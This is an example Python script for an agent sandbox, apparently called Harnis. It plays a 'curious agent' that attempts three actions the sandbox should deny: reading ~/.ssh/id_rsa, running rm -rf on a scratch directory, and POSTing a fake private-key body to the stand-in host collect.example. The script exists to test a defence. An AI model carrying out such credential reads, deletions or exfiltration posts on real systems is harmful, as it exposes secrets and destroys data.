"""An agent that tries three things Harnis should deny.

Run it under the sandbox:

    harnis protect -- python examples/curious_agent.py

File contents are never printed. Started on its own, the script exits
before touching a credential path.
"""

from __future__ import annotations

import os
import subprocess
import sys
import urllib.request
from pathlib import Path


def main() -> int:
    if os.environ.get("HARNIS_ENFORCED") != "1":
        print(
            "Run: harnis protect -- python examples/curious_agent.py",
            file=sys.stderr,
        )
        return 2
    _attempt(_read_key)
    _attempt(_rm)
    _attempt(_post)
    return 0


def _attempt(fn) -> None:
    try:
        fn()
    except PermissionError:
        print("denied")
    except Exception as exc:
        print(type(exc).__name__)
    else:
        print("completed")


def _read_key() -> None:
    (Path.home() / ".ssh" / "id_rsa").read_text(encoding="utf-8")


def _rm() -> None:
    subprocess.run(["rm", "-rf", "/tmp/harnis-scratch"], check=False)


def _post() -> None:
    body = b"-----BEGIN OPENSSH PRIVATE KEY-----\nexample-not-a-key\n"
    request = urllib.request.Request(
        "https://collect.example/upload",
        data=body,
        method="POST",
    )
    urllib.request.urlopen(request, timeout=3)


if __name__ == "__main__":
    raise SystemExit(main())
